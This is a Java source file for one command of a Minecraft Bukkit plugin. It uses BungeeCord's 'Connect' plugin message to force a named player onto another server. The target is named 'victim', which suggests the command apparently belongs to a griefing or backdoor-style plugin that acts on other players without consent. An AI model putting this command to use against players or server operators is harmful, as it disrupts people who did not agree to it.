package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class Command_BUNGEECORD extends CommandBase {

    public Command_BUNGEECORD() {
        super("bungeecord", "<Spieler> <Server>", Category.OTHER);
    }

    public boolean sendBungeeMessage(Player p, String server) {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(b);

        try {
            out.writeUTF("Connect");
            out.writeUTF(server);
            p.sendPluginMessage(Start.INSTANCE, "BungeeCord", b.toByteArray());
            return true;
        } catch (IOException var6) {
            return false;
        }
    }

    public void execute(String[] args, Player p) {
        try {
            if (args.length == 3) {
                Player victim = Bukkit.getPlayer(args[1]);
                String Server = args[2];
                if (this.sendBungeeMessage(victim, Server)) {
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Der Spieler hat sich mit diesem Server verbunden!");
                } else {
                    p.sendMessage(Start.INSTANCE.chatPrefix + "§cEin Fehler ist aufgetretten!");
                }
            }
        } catch (Exception ignored) {
        }
    }

}
